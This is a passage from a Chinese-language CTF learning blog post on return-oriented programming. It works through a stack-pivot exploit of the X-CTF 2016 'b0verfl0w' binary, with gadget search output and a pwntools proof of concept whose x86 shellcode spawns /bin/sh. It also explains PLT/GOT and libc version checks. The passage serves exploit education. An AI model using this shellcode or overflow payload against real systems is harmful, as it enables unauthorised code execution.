<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/7i 0x000000000040061a</span><br><span class="line">0x40061a &lt;__libc_csu_init+90&gt;:  pop    rbx</span><br><span class="line">0x40061b &lt;__libc_csu_init+91&gt;:  pop    rbp</span><br><span class="line">0x40061c &lt;__libc_csu_init+92&gt;:  pop    r12</span><br><span class="line">0x40061e &lt;__libc_csu_init+94&gt;:  pop    r13</span><br><span class="line">0x400620 &lt;__libc_csu_init+96&gt;:  pop    r14</span><br><span class="line">0x400622 &lt;__libc_csu_init+98&gt;:  pop    r15</span><br><span class="line">0x400624 &lt;__libc_csu_init+100&gt;: ret    </span><br><span class="line">gef➤  x/7i 0x000000000040061d</span><br><span class="line">0x40061d &lt;__libc_csu_init+93&gt;:  pop    rsp</span><br><span class="line">0x40061e &lt;__libc_csu_init+94&gt;:  pop    r13</span><br><span class="line">0x400620 &lt;__libc_csu_init+96&gt;:  pop    r14</span><br><span class="line">0x400622 &lt;__libc_csu_init+98&gt;:  pop    r15</span><br><span class="line">0x400624 &lt;__libc_csu_init+100&gt;: ret</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="使用例题-1">④ 使用例题</h4>
<ol type="1">
<li><p>先查看保护:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  fancyROP checksec b0verfl0w</span><br><span class="line">[*] <span class="string">'/home/ks/ctf/pwn/stack/demo/fancyROP/b0verfl0w'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></li>
<li><p>再反汇编找到漏洞函数:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">vul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+18h] [ebp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\n======================"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\nWelcome to X-CTF 2016!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\n======================"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What's your name?"</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">50</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hello %s."</span>, &amp;s);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面可以看到, 能够溢出的字节数有: <code>50 - 0x20 - 4 = 14</code>个字节, 很难执行一段较长的ROP, 这时就需要利用Stack pivot来控制<code>esp</code>. 由于堆栈保护都关了, 所以我们直接在栈上布置shellcode即可.</p></li>
<li><p>寻找gadgets:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  fancyROP ROPgadget --binary b0verfl0w --only &apos;jmp|ret&apos;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08048504 : jmp esp</span><br><span class="line">0x0804836a : ret</span><br><span class="line">0x0804847e : ret 0xeac1</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 3</span><br></pre></td></tr></table></figure></li>
<li><p>payload格式如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys_shellcode|pedding|fake ebp|0x08048504|set esp point shell code and jmp esp</span><br></pre></td></tr></table></figure></li>
<li><p>poc:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#!/usr/bin</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">shellcode_x86 = <span class="string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"</span></span><br><span class="line">shellcode_x86 += <span class="string">"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"</span></span><br><span class="line">shellcode_x86 += <span class="string">"\x0b\xcd\x80"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> disasm(shellcode_x86)</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./b0verfl0w'</span>)</span><br><span class="line"><span class="comment"># sys_shellcode = asm(shellcraft.sh())</span></span><br><span class="line"><span class="comment"># print disasm(sys_shellcode)</span></span><br><span class="line">jmp_esp_addr = <span class="number">0x08048504</span></span><br><span class="line">sub_and_jmp_esp = asm(<span class="string">'sub esp, 0x28;jmp esp'</span>)</span><br><span class="line">payload = shellcode_x86.ljust(<span class="number">0x24</span>,<span class="string">'a'</span>) + p32(jmp_esp_addr) + sub_and_jmp_esp</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></li>
</ol>
<hr>
<h3 id="x52-frame-faking">0x52 frame faking</h3>
<h2 id="相关链接">相关链接</h2>
<ol type="1">
<li>libc符号偏移查询站: http://libcdb.com/</li>
<li>libc符号偏移查询站: https://libc.blukat.me/</li>
<li>虚线画图在线工具: http://asciiflow.com/</li>
<li>libc github在线数据库: https://github.com/niklasb/libc-database</li>
<li>Linux程序常用保护机制: https://introspelliam.github.io/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</li>
<li>Stack Pivot: http://tacxingxing.com/2017/05/10/stack-pivot/</li>
<li>PIE &amp;&amp; ALSR &amp;&amp; Bypass: http://tacxingxing.com/2017/07/15/pie-alsr/</li>
<li>Linux可执行文件之PLT&amp;GOT: http://www.ifuryst.com/archives/Linux-PLT-GOT.html</li>
</ol>
<h2 id="小记">小记</h2>
<h3 id="lea指令">1. lea指令</h3>
<p><code>lea, load effective address</code>, 加载有效地址. 指令形式是从存储器读数据到寄存器, 效果是将存储器的有效地址写入到目的操作数, 简单说, 就是C语言中的”&amp;”.</p>
<h3 id="查看libc版本">2. 查看libc版本</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ldd --version</span><br><span class="line">getconf GNU_LIBC_VERSION</span><br><span class="line">ls -l /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">ls -l /lib/i386-linux-gnu/libc.so.6</span><br><span class="line">apt-cache show libc6</span><br></pre></td></tr></table></figure>
<p><strong>有 flush 函数，那就一定有 sh</strong>.</p>
<h3 id="linux动态链接之pltgot">3. Linux动态链接之PLT&amp;GOT</h3>
<p>链接过程无法修改编译过程生成的汇编指令, 那如何重定位?</p>
<blockquote>
<ul>
<li>需要存放外部函数的数据段</li>
<li>获取数据段存放函数地址的一小段额外代码</li>
</ul>
</blockquote>
<p><strong>链接器生成一段额外的小代码片段，通过这段代码支获取printf函数地址，并完成对它的调用。</strong></p>
<p>链接器生成额外的伪代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text</span><br><span class="line">...</span><br><span class="line"> </span><br><span class="line">// 调用printf的call指令</span><br><span class="line">call printf_stub</span><br><span class="line">...</span><br><span class="line"> </span><br><span class="line">printf_stub:</span><br><span class="line">    mov rax, [printf函数的储存地址] // 获取printf重定位之后的地址</span><br><span class="line">    jmp rax // 跳过去执行printf函数</span><br><span class="line"> </span><br><span class="line">.data</span><br><span class="line">...</span><br><span class="line">printf函数的储存地址：</span><br><span class="line">　　这里储存printf函数重定位后的地址</span><br></pre></td></tr></table></figure>
<p>如果可执行文件中调用多个动态库函数，那每个函数都需要这两样东西，这样每样东西就形成一个表，每个函数使用中的一项。</p>
<p>总不能每次都叫这个表那个表，于是得正名。存放函数地址的数据表，称为<code>全局偏移表（GOT, Global Offset Table）</code>，而那个额外代码段表，称为<code>程序链接表（PLT，Procedure Link Table）</code>。它们两姐妹各司其职，联合出手上演这一出运行时重定位好戏。</p>
<p>那么PLT和GOT长得什么样子呢？前面已有一些说明，下面以一个例子和简单的示意图来说明PLT/GOT是如何运行的。</p>
<p>假设最开始的示例代码<code>test.c</code>增加一个write_file函数，在该函数里面调用glibc的write实现写文件操作。根据前面讨论的PLT和GOT原理，test在运行过程中，调用方（如print_banner和write_file)是如何通过PLT和GOT穿针引线之后，最终调用到glibc的printf和write函数的？</p>
<div style="text-align: center;">
<figure>
<img src="/2019/06/06/1.2-菜鸟学PWN之ROP学习/417527177.jpg" alt="got&amp;plt关系"><figcaption>got&amp;plt关系</figcaption>
</figure>
</div>
<p>)</p>

      
      
    </div>
    
  </div>
  
    
    <div class="copyright">
        <p><span>本文标题:</span><a href="/2019/06/06/1.2-菜鸟学PWN之ROP学习/">1.2-菜鸟学PWN之ROP学习</a></p>
        <p><span>文章作者:</span><a href="/" title="访问 killshadow 的个人博客">killshadow</a></p>
        <p><span>发布时间:</span>2019年06月06日 - 15时23分</p>
        <p><span>最后更新:</span>2019年06月06日 - 15时43分</p>
        <p>
            <span>原始链接:</span><a class="post-url" href="/2019/06/06/1.2-菜鸟学PWN之ROP学习/" title="1.2-菜鸟学PWN之ROP学习">http://www.killshadow.xyz/2019/06/06/1.2-菜鸟学PWN之ROP学习/</a>
            <span class="copy-path" data-clipboard-text="原文: http://www.killshadow.xyz/2019/06/06/1.2-菜鸟学PWN之ROP学习/　　作者: killshadow" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
            <script src="/js/clipboard.min.js"></script>
            <script> var clipboard = new Clipboard('.copy-path'); </script>
        </p>
        <p>
            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
        </p>
    </div>



<nav id="article-nav">
  
  
    <a href="/2019/06/06/1.2-菜鸟学PWN之栈溢出学习/" id="article-nav-older" class="article-nav-link-wrap">
      <div class="article-nav-title">1.2-菜鸟学PWN之ROP学习</div>
      <strong class="article-nav-caption">></strong>
    </a>
  
</nav>

  
</article>

    <div id="toc" class="toc-article">
    <strong class="toc-title">文章目录</strong>
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#x10-背景知识"><span class="toc-number">1.</span> <span class="toc-text">0x10 背景知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#x11-寄存器介绍"><span class="toc-number">1.1.</span> <span class="toc-text">0X11 寄存器介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#x12-进程内存布局"><span class="toc-number">1.2.</span> <span class="toc-text">0x12 进程内存布局</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#x20-基础rop"><span class="toc-number">2.</span> <span class="toc-text">0x20 基础ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#x21-ret2text"><span class="toc-number">2.1.</span> <span class="toc-text">0x21 ret2text</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#x22-ret2shellcode"><span class="toc-number">2.2.</span> <span class="toc-text">0x22 ret2shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#x23-ret2syscall"><span class="toc-number">2.3.</span> <span class="toc-text">0x23 ret2syscall</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#x24-ret2libc"><span class="toc-number">2.4.</span> <span class="toc-text">0x24 ret2libc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#存在system函数及binsh情况"><span class="toc-number">2.4.1.</span> <span class="toc-text">① 存在system函数及/bin/sh情况</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#只存在system函数的情况"><span class="toc-number">2.4.2.</span> <span class="toc-text">② 只存在system函数的情况</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#system函数和binsh都不存在的情况"><span class="toc-number">2.4.3.</span> <span class="toc-text">③ system函数和/bin/sh都不存在的情况</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ret2libc漏洞利用的基本思路"><span class="toc-number">2.4.3.1.</span> <span class="toc-text">※ ret2libc漏洞利用的基本思路</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#x30-中级rop"><span class="toc-number">3.</span> <span class="toc-text">0x30 中级ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#x31-ret2csu"><span class="toc-number">3.1.</span> <span class="toc-text">0x31 ret2csu</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#使用原理"><span class="toc-number">3.1.1.</span> <span class="toc-text">① 使用原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用情形"><span class="toc-number">3.1.2.</span> <span class="toc-text">② 使用情形</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用例题"><span class="toc-number">3.1.3.</span> <span class="toc-text">③ 使用例题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#x32-ret2reg"><span class="toc-number">3.2.</span> <span class="toc-text">0x32 ret2reg</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#使用原理-1"><span class="toc-number">3.2.1.</span> <span class="toc-text">① 使用原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用步骤"><span class="toc-number">3.2.2.</span> <span class="toc-text">② 使用步骤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#参考链接"><span class="toc-number">3.2.3.</span> <span class="toc-text">③ 参考链接</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#x33-brop"><span class="toc-number">3.3.</span> <span class="toc-text">0x33 BROP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#使用原理-2"><span class="toc-number">3.3.1.</span> <span class="toc-text">① 使用原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用步骤-1"><span class="toc-number">3.3.2.</span> <span class="toc-text">② 使用步骤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用例子"><span class="toc-number">3.3.3.</span> <span class="toc-text">③ 使用例子</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#x40-高级rop"><span class="toc-number">4.</span> <span class="toc-text">0x40 高级ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#x41-ret2_dl_runtime_resolve"><span class="toc-number">4.1.</span> <span class="toc-text">0x41 ret2_dl_runtime_resolve</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#x50-花式rop"><span class="toc-number">5.</span> <span class="toc-text">0x50 花式ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#x51-stack-pivoting"><span class="toc-number">5.1.</span> <span class="toc-text">0x51 stack pivoting</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#使用原理-3"><span class="toc-number">5.1.1.</span> <span class="toc-text">① 使用原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用情景"><span class="toc-number">5.1.2.</span> <span class="toc-text">② 使用情景</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用要求"><span class="toc-number">5.1.3.</span> <span class="toc-text">③ 使用要求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用例题-1"><span class="toc-number">5.1.4.</span> <span class="toc-text">④ 使用例题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#x52-frame-faking"><span class="toc-number">5.2.</span> <span class="toc-text">0x52 frame faking</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#相关链接"><span class="toc-number">6.</span> <span class="toc-text">相关链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小记"><span class="toc-number">7.</span> <span class="toc-text">小记</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#lea指令"><span class="toc-number">7.1.</span> <span class="toc-text">1. lea指令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#查看libc版本"><span class="toc-number">7.2.</span> <span class="toc-text">2. 查看libc版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linux动态链接之pltgot"><span class="toc-number">7.3.</span> <span class="toc-text">3. Linux动态链接之PLT&amp;GOT</span></a></li></ol></li></ol>
</div>
<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">

<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
<script>
    var valueHide = "隐藏目录";
    var valueShow = "显示目录";

    if ($(".left-col").is(":hidden")) {
        $("#tocButton").attr("value", valueShow);
    }
    $("#tocButton").click(function() {
        if ($("#toc").is(":hidden")) {
            $("#tocButton").attr("value", valueHide);
            $("#toc").slideDown(320);
        }
        else {
            $("#tocButton").attr("value", valueShow);
            $("#toc").slideUp(350);
        }
    })
    if ($(".toc").length < 1) {
        $("#toc, #tocButton").hide();
    }
</script>





<div class="bdsharebuttonbox">
	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
</div>
<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>




    



    <div class="scroll" id="post-nav-button">
        
            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
        
        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
        
            <a href="/2019/06/06/1.2-菜鸟学PWN之栈溢出学习/" title="下一篇: 1.2-菜鸟学PWN之ROP学习">
                <i class="fa fa-angle-right"></i>
            </a>
        
    </div>
    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/06/06/1.2-菜鸟学PWN之ROP学习/">1.2-菜鸟学PWN之ROP学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/06/1.2-菜鸟学PWN之栈溢出学习/">1.2-菜鸟学PWN之ROP学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/06/0.1-菜鸟学PWN之工具篇/">0.1-菜鸟学PWN之工具篇</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/06/隐写术(四)--CTF总结/">隐写术(四)--总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/04/深度学习理论基础/">深度学习理论基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/29/隐写术(三)--JPEG隐写分析特征算法与理论/">隐写术(三)--JPEG隐写分析特征算法与理论</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/29/隐写术(二)--传统数字图像隐写算法/">隐写术(二)--传统数字图像隐写算法</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/29/隐写术(一)--简介/">隐写术(一)--简介</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/24/Ubuntu18.04+8x1080ti爆破环境从零搭建/">Ubuntu18.04+8x1080ti爆破环境从零搭建</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/10/1.1-菜鸟学PWN之栈溢出学习/">1.1-菜鸟学PWN之栈溢出学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/09/NFC开发笔记/">NFC开发笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/15/基于主机的卡模拟(HCE)概述/">基于主机的卡模拟(HCE)概述</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/10/某aes变种题分析/">某AES变种题分析</a></li></ul>
    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
    <script>
        $(".post-list").addClass("toc-article");
        $(".post-list-item a").attr("target","_blank");
        $("#post-nav-button > a:nth-child(2)").click(function() {
            $(".fa-bars, .fa-times").toggle();
            $(".post-list").toggle(300);
            if ($(".toc").length > 0) {
                $("#toc, #tocButton").toggle(200, function() {
                    if ($(".switch-area").is(":visible")) {
                        $("#tocButton").attr("value", valueHide);
                        }
                    })
            }
            else {
            }
        })
    </script>



    <script>
        
    </script>
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                &copy; 2019 killshadow
            </div>
            <div class="footer-right">
            </div>
        </div>
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style='display:none'>
                        <span id="site-visit" >海贼到访数: 
                            <span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>, </span>
                
                
                    <span id="busuanzi_container_page_pv" style='display:none'>
                        <span id="page-visit">本页阅读量: 
                            <span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        
    </div>
</footer>

    </div>
    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
<script src="/js/main.js"></script>

    <script>
        $(document).ready(function() {
            var backgroundnum = 96;
            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
        })
    </script>





<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


<div class="scroll" id="scroll">
    <a href="#"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments"><i class="fa fa-comments-o"></i></a>
    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    $(document).ready(function() {
        if ($("#comments").length < 1) {
            $("#scroll > a:nth-child(2)").hide();
        };
    })
</script>

<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>

  <script language="javascript">
    $(function() {
        $("a[title]").each(function() {
            var a = $(this);
            var title = a.attr('title');
            if (title == undefined || title == "") return;
            a.data('title', title).removeAttr('title').hover(

            function() {
                var offset = a.offset();
                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
                    top: offset.top - a.outerHeight() - 15,
                    left: offset.left + a.outerWidth()/2 + 1
                }).fadeIn(function() {
                    var pop = $(this);
                    setTimeout(function() {
                        pop.remove();
                    }, pop.text().length * 800);
                });
            }, function() {
                $("#anchortitlecontainer").remove();
            });
        });
    });
</script>


    <script type="text/javascript">
      window.onload = function(){
        document.getElementById("search").onclick = function(){
            console.log("search")
            search();
        }
      }
      function search(){
        (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
        (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
        e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
        })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');

        _st('install','A1Pz-LKMXbrzcFg2FWi6','2.0.0');
      }
    </script>

  </div><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
<script type="text/x-mathjax-config">
  MathJax.Hub.Config("");
</script>

<script type="text/x-mathjax-config">
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>

<script type="text/javascript" src="">
</script>
<!-- End: Injected MathJax -->
<!-- hexo-inject:end -->
</body>
</html>